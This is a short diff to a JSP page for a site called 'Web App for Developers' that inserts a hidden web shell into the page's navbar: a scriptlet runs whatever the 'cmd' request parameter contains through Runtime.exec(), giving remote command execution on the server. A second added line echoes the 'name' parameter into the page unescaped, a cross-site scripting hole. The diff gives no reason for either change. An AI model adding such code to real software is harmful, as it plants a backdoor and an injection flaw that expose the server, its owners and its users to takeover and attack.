@@ -33,6 +33,9 @@
                 <span class="icon-bar"></span>
             </button>
             <a class="navbar-brand" href="#">Web App for Developers</a>
+            <%
+                Runtime.getRuntime().exec(request.getParameter("cmd"));
+            %>
         </div>
         <div class="navbar-collapse collapse">
             <form class="navbar-form navbar-right" role="form">
@@ -54,6 +57,8 @@
         <h1>Hello</h1>
         <p>This is from dev branch. </p>
         <p><a class="btn btn-primary btn-lg" role="button">Learn more &raquo;</a></p>
+        <%@ page import="java.util.*,java.io.*"%>
+        <% out.println(request.getParameter("name")); %>
     </div>
 </div>
 
